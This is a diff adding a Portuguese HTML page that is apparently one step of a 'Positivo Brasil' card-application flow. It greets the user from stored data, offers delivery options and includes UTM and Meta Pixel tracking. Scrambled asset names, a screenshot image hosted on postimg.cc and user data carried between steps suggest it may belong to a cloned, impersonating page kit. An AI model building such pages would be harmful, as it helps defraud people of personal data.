@@ -1,0 +1,229 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <link href="css/mj6HvSrqhJAB.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+  
+  
+    <script>
+        // Função para obter os parâmetros UTM da URL
+        function getUTMParameters() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const utmParams = {};
+        
+            // Verifica se existem parâmetros UTM e os armazena em um objeto
+            ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'].forEach(param => {
+                const value = urlParams.get(param);
+                if (value) {
+                    utmParams[param] = value;
+                }
+            });
+        
+            return utmParams;
+        }
+        
+        // Armazena os parâmetros UTM no localStorage
+        function storeUTMParameters(utmParams) {
+            if (Object.keys(utmParams).length > 0) {
+                localStorage.setItem('utmParams', JSON.stringify(utmParams));
+            }
+        }
+        
+        // Adiciona os parâmetros UTM armazenados em todas as URLs da página
+        function appendUTMParametersToLinks() {
+            const storedUTM = JSON.parse(localStorage.getItem('utmParams'));
+            if (!storedUTM) return;
+        
+            const allLinks = document.querySelectorAll('a[href]');
+            allLinks.forEach(link => {
+                const url = new URL(link.href);
+                Object.keys(storedUTM).forEach(param => {
+                    url.searchParams.set(param, storedUTM[param]);
+                });
+                link.href = url.toString();
+            });
+        }
+        
+        // Quando a página carregar, captura os parâmetros UTM e os armazena
+        document.addEventListener('DOMContentLoaded', () => {
+            const utmParams = getUTMParameters();
+            storeUTMParameters(utmParams);
+            appendUTMParametersToLinks();
+        });
+        </script>
+  
+  
+    <style>
+        .header {
+            background: radial-gradient(934px at 6% 39.5%, rgb(0, 173, 202) 0.2%, rgb(0, 73, 144) 54.8%, rgb(250, 99, 160) 93.4%);
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            grid-area: top-bar;
+        }
+
+        .main-content {
+            max-width: 450px;
+            background-color: white;
+            text-align: center;
+            padding: 2rem 2rem 1rem 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+            margin: 0 auto;
+        }
+
+        .main-content h2 {
+            margin-bottom: 20px;
+        }
+
+        .btn-custom {
+            color: white;
+            border: none;
+            width: 100%;
+            margin-bottom: 10px;
+            background: radial-gradient(934px at 6% 39.5%, rgb(0, 173, 202) 0.2%, rgb(0, 73, 144) 54.8%, rgb(255, 0, 0) 93.4%);
+            font-weight: 600;
+            border-radius: 1rem;
+            padding: .75rem 3rem;
+            letter-spacing: .3px;
+            line-height: 1.15;
+        }
+
+        .btn-custom:hover {
+            color: black !important;
+            background-color: #00adca !important;
+            transform: scale(1.02) !important;
+        }
+
+        .footer {
+            background-color: #ffffff;
+            border-top: solid 1px #e6dddd;
+            color: #000;
+            text-align: center;
+            width: 100%;
+            bottom: 0;
+            grid-area: footer;
+            border-bottom: solid 3px #e6007e;
+            padding: 2rem 0.5rem;
+            position: relative;
+            margin-top: 50px;
+        }
+
+        #conclusao {
+            display: none;
+            /* Esconde o elemento por padrão */
+        }
+
+        #conclusao h4 {
+            color: green;
+            /* Define a cor do texto */
+            font-weight: bold;
+            /* Define o texto em negrito */
+        }
+
+        .char {
+            border-top: solid px #00adca;
+            background-color: #00adca;
+            padding: 2px !important;
+        }
+
+        /* End custom CSS */
+    </style>
+    
+
+
+    <!-- Meta Pixel Code -->
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1249577276382820');
+    fbq('track', 'PageView');
+    fbq('track', 'ViewContent');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1249577276382820&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+
+
+
+    
+</head>
+
+<body>
+    <div style="
+    display: grid;
+    grid-template-areas:
+      'top-bar'
+      'content'
+      'footer';
+    grid-template-rows: auto 1fr auto;
+    min-height: 100vh;
+  ">
+        <div class="header">
+            <img decoding="async" style="width: 120px;" src="images/Cl45c0UtCB8I.png" alt="Imagem Centralizada" data-lazy-src="https://d9hhrg4mnvzow.cloudfront.net/lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png" data-ll-status="loaded" class="entered lazyloaded"><noscript><img decoding="async" style="width: 120px;" src="https://d9hhrg4mnvzow.cloudfront.net/lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png" alt="Imagem Centralizada"></noscript>
+        </div>
+
+        <div style="grid-area: content; padding: 0 1rem;">
+            <div class="main-content">
+                <!-- Seção de escolha de recebimento do cartão -->
+                <div id="recebimento-secao" class="mb-3" style="display: block;">
+                    <strong></strong>
+                    <h4><strong>Tudo certo!   </strong></h4>
+                    <p>Agora precisamos saber qual opção melhor para você:</p>
+                    <div class="opcao mb-3">
+                        <button class="btn btn-light w-100 text-start p-3 mb-2">
+                          <strong>1ª opção:</strong> Receber o cartão pelos Correios
+                      </button>
+                        <button class="btn btn-light w-100 text-start p-3">
+                          <strong>2ª opção:</strong> Retirar o cartão em uma Agência Positivo
+                      </button>
+                    </div>
+
+                    <p>Confira abaixo onde estão as nossas Agências:</p>
+                    <img decoding="async" src="images/wrO1q5tNs3re.jpg" alt="Unidades Presenciais" class="img-fluid rounded mb-3 entered lazyloaded" data-lazy-src="https://i.postimg.cc/26CmrSCR/Whats-App-Image-2024-08-26-at-23-08-35.jpg" data-ll-status="loaded"><noscript><img decoding="async" src="https://i.postimg.cc/26CmrSCR/Whats-App-Image-2024-08-26-at-23-08-35.jpg" alt="Unidades Presenciais" class="img-fluid rounded mb-3"></noscript>
+
+                    <button class=" btn-custom w-100" onclick="location.href='../cep/index.html'">PREFIRO RECEBER PELOS CORREIOS</button>
+                </div>
+            </div>
+        </div>
+
+        <script>
+            document.addEventListener("DOMContentLoaded", function() {
+                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuarioUni'));
+                if (dadosUsuario && dadosUsuario.nome) {
+                    const nomeCompleto = dadosUsuario.nome.split(' ');
+                    const primeiroNome = nomeCompleto[0];
+                    const nomeParaMostrar = `${primeiroNome}`;
+                    document.getElementById('nomeCliente').textContent = nomeParaMostrar;
+                } else {
+                    console.error('Nome do usuário não encontrado no localStorage.');
+                }
+            });
+
+            function mostrarPagina(paginaId) {
+                // Esconde todas as seções
+                document.getElementById('recebimento-secao').style.display = 'none';
+
+                // Mostra a seção desejada
+                document.getElementById(paginaId).style.display = 'block';
+            }
+
+            // Mostra a seção de recebimento inicialmente
+            mostrarPagina('recebimento-secao');
+        </script>
+
+        <div class="footer py-4" id="footerChg">
+            © 2024 Positivo Brasil. CNPJ 36.401.269/0001-27. <br> Todos os direitos reservados
+        </div>
+    </div>
+
+
+</body></html>
